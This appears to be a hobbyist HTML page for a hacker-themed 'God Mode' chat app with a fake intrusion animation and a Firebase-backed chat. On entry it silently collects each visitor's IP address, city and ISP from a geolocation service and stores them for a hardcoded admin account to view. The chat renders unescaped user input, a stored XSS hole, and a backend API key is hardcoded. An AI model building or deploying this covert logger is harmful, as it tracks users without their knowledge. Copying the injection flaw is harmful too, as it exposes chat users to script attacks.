<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Ultimate God Mode | V4.0 Private</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <style>
        :root { --p: #7d5fff; --s: #ff4dff; --bg: #050505; --glass: rgba(255,255,255,0.05); --border: rgba(255,255,255,0.1); }
        * { box-sizing: border-box; font-family: 'Segoe UI', sans-serif; transition: 0.3s; }
        body { margin: 0; background: var(--bg); color: #fff; overflow: hidden; }

        /* MATRIX HACKING OVERLAY */
        #hackOverlay { display:none; position:fixed; inset:0; background:#000; z-index:20000; color:#0f0; padding:20px; font-family:monospace; font-size:11px; overflow:hidden; }

        /* LOGIN SCREEN */
        #auth { position: fixed; inset: 0; background: #000; z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 30px; text-align: center; }
        #auth img { width: 190px; height: 190px; border-radius: 50%; border: 3px solid var(--p); box-shadow: 0 0 60px var(--p); object-fit: cover; margin-bottom: 20px; }
        #auth h1 { font-size: 28px; margin: 0; letter-spacing: -1px; text-transform: uppercase; }
        #auth input { width: 100%; max-width: 300px; padding: 20px; border-radius: 20px; background: var(--glass); border: 1px solid var(--border); color: #fff; margin: 25px 0 15px; text-align: center; font-size: 16px; outline: none; }
        #auth button { width: 100%; max-width: 300px; padding: 20px; border-radius: 20px; background: var(--p); border: none; color: #fff; font-weight: 800; cursor: pointer; text-transform: uppercase; box-shadow: 0 10px 25px rgba(125,95,255,0.4); }

        /* MAIN APP */
        .app { max-width: 480px; margin: auto; height: 100vh; display: flex; flex-direction: column; position: relative; }
        header { padding: 45px 25px 15px; border-bottom: 1px solid var(--border); backdrop-filter: blur(10px); display: flex; justify-content: space-between; align-items: center; }
        
        .page { display: none; padding: 20px; flex: 1; overflow-y: auto; padding-bottom: 110px; }
        .page.active { display: block; animation: fadeIn 0.5s ease; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }

        .dash-card { background: var(--glass); border-radius: 24px; padding: 20px; margin-bottom: 15px; border: 1px solid var(--border); backdrop-filter: blur(10px); position: relative; overflow: hidden; }
        .admin-badge { background: gold; color: #000; font-size: 9px; font-weight: 900; padding: 2px 6px; border-radius: 4px; margin-left: 5px; }

        /* CHAT SYSTEM */
        #chatBox { height: 60vh; overflow-y: auto; display: flex; flex-direction: column; gap: 12px; padding: 10px; }
        .msg { padding: 12px 18px; border-radius: 18px; font-size: 14px; max-width: 80%; line-height: 1.4; position: relative; }
        .msg.me { background: var(--p); align-self: flex-end; border-bottom-right-radius: 4px; }
        .msg.them { background: #1a1a1a; align-self: flex-start; border: 1px solid var(--border); border-bottom-left-radius: 4px; }
        .msg-info { font-size: 9px; opacity: 0.5; margin-bottom: 4px; display: block; }

        /* NAV BAR */
        nav { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); width: 90%; height: 75px; background: rgba(10,10,10,0.8); backdrop-filter: blur(20px); border-radius: 30px; border: 1px solid var(--border); display: flex; justify-content: space-around; align-items: center; z-index: 1000; }
        .nav-btn { color: #444; font-size: 22px; cursor: pointer; transition: 0.3s; }
        .nav-btn.active { color: var(--p); text-shadow: 0 0 15px var(--p); transform: translateY(-5px); }

        /* IP LOGGER PANEL */
        .ip-item { font-size: 11px; font-family: monospace; color: #0f0; border-bottom: 1px solid #222; padding: 5px 0; }
        .danger-btn { background: #ff4d4d; color: white; border: none; width: 100%; padding: 12px; border-radius: 12px; font-weight: bold; margin-top: 10px; cursor: pointer; }
    </style>
</head>
<body>

<div id="hackOverlay"></div>

<div id="auth">
    <img src="http://googleusercontent.com/generated_image_content/0.png" alt="God Mode Skull">
    <h1>Ultimate God Mode</h1>
    <p style="color:#555; margin-top:5px;">System Security Bypass Required</p>
    <input type="text" id="userInput" placeholder="Identity Name" autocomplete="off">
    <button onclick="initiateHack()">Initiate Access</button>
</div>

<div class="app">
    <header>
        <h2 style="margin:0; font-size: 20px;">Console <span id="admTag" style="display:none;" class="admin-badge">GOD</span></h2>
        <div onclick="logout()" style="opacity:0.5; cursor:pointer;"><i class="fa-solid fa-power-off"></i></div>
    </header>

    <div id="home" class="page active">
        <div id="adminPanel" style="display:none;">
            <div class="dash-card" style="border-color: gold;">
                <h4 style="color:gold; margin:0 0 10px;"><i class="fa-solid fa-tower-broadcast"></i> MASTER CONTROL</h4>
                <div id="ipList">
                    <p style="font-size:10px; opacity:0.5;">Target IP Logs:</p>
                </div>
                <button class="danger-btn" onclick="wipeSystem()">WIPE ALL DATA (SELF-DESTRUCT)</button>
            </div>
        </div>

        <div class="dash-card">
            <h3 style="margin:0;">Identity: <span id="displayUser">...</span></h3>
            <p style="font-size:12px; color:var(--p); margin:5px 0 0;">Status: Secure Node Connected</p>
        </div>
    </div>

    <div id="chat" class="page">
        <div id="chatBox"></div>
        <div style="display:flex; gap:10px; margin-top:15px; background:var(--glass); padding:10px; border-radius:20px; border:1px solid var(--border);">
            <input id="msgInput" style="flex:1; background:transparent; border:none; color:white; padding:10px; outline:none;" placeholder="Enter encrypted message..."/>
            <button onclick="sendMsg()" style="background:var(--p); border:none; width:45px; height:45px; border-radius:50%; color:white;"><i class="fa-solid fa-paper-plane"></i></button>
        </div>
    </div>

    <nav>
        <div class="nav-btn active" onclick="openPage('home',this)"><i class="fa-solid fa-shield-virus"></i></div>
        <div class="nav-btn" onclick="openPage('chat',this)"><i class="fa-solid fa-ghost"></i></div>
    </nav>
</div>

<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/12.9.0/firebase-app.js";
    import { getDatabase, ref, set, push, onValue, remove, get } from "https://www.gstatic.com/firebasejs/12.9.0/firebase-database.js";

    const firebaseConfig = { apiKey: "AIzaSyCSD1O9tV7xDZu_kljq-0NMhA2DqtW5quE", databaseURL: "https://live-chat-b810c-default-rtdb.firebaseio.com" };
    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);

    let currentUser = localStorage.getItem("god_user");

    // IP LOGGER FUNCTION
    async function logTarget() {
        try {
            const res = await fetch('https://ipapi.co/json/');
            const data = await res.json();
            const logEntry = {
                user: currentUser,
                ip: data.ip,
                city: data.city,
                provider: data.org,
                time: new Date().toLocaleTimeString()
            };
            set(ref(db, "logs/" + currentUser), logEntry);
        } catch(e) { console.log("Shield Active"); }
    }

    window.initiateHack = () => {
        const name = document.getElementById("userInput").value.trim();
        if(!name) return;

        const overlay = document.getElementById("hackOverlay");
        overlay.style.display = "block";
        const steps = [
            "SCANNING FOR VULNERABILITIES...",
            "EXPLOITING KERNEL STACK...",
            "BYPASSING FIREWALL V2.4...",
            "LOGGING TARGET IP & GEOLOCATION...",
            "INJECTING ENCRYPTED SESSION...",
            "ACCESS GRANTED TO MAINFRANCE."
        ];

        let step = 0;
        const interval = setInterval(() => {
            overlay.innerHTML += `<p style="margin:5px 0;">[SYSTEM]: ${steps[step]}</p>`;
            step++;
            if(step >= steps.length) {
                clearInterval(interval);
                setTimeout(() => {
                    localStorage.setItem("god_user", name);
                    location.reload();
                }, 800);
            }
        }, 400);
    };

    if(currentUser) {
        document.getElementById("auth").style.display = "none";
        document.getElementById("displayUser").innerText = currentUser;
        logTarget(); // Log user data upon entry

        if(currentUser === "Admin786") {
            document.getElementById("adminPanel").style.display = "block";
            document.getElementById("admTag").style.display = "inline";
            loadLogs();
        }
        loadMessages();
    }

    function loadMessages() {
        onValue(ref(db, "globalChat"), snap => {
            const box = document.getElementById("chatBox");
            box.innerHTML = "";
            snap.forEach(child => {
                const m = child.val();
                const type = m.from === currentUser ? 'me' : 'them';
                box.innerHTML += `<div class="msg ${type}"><span class="msg-info">${m.from}</span>${m.text}</div>`;
            });
            box.scrollTop = box.scrollHeight;
        });
    }

    function loadLogs() {
        onValue(ref(db, "logs"), snap => {
            const list = document.getElementById("ipList");
            list.innerHTML = "";
            snap.forEach(child => {
                const l = child.val();
                list.innerHTML += `<div class="ip-item"><b>${l.user}</b>: ${l.ip} (${l.city})</div>`;
            });
        });
    }

    window.sendMsg = () => {
        const inp = document.getElementById("msgInput");
        if(!inp.value) return;
        push(ref(db, "globalChat"), { from: currentUser, text: inp.value });
        
        // Ghost Auto-Bot Reply
        if(currentUser !== "Admin786") {
            setTimeout(() => {
                push(ref(db, "globalChat"), { from: "Ghost_System", text: "Admin is watching your packets... 👁️" });
            }, 3000);
        }
        inp.value = "";
    };

    window.wipeSystem = () => {
        if(confirm("Are you sure? This will wipe all chats and logs!")) {
            remove(ref(db, "globalChat"));
            remove(ref(db, "logs"));
            alert("Data Wiped Successfully.");
        }
    };

    window.logout = () => { localStorage.clear(); location.reload(); };
    window.openPage = (id, btn) => {
        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
        document.getElementById(id).classList.add('active');
        document.querySelectorAll('.nav-btn').forEach(n => n.classList.remove('active'));
        btn.classList.add('active');
    };
</script>
</body>
</html>
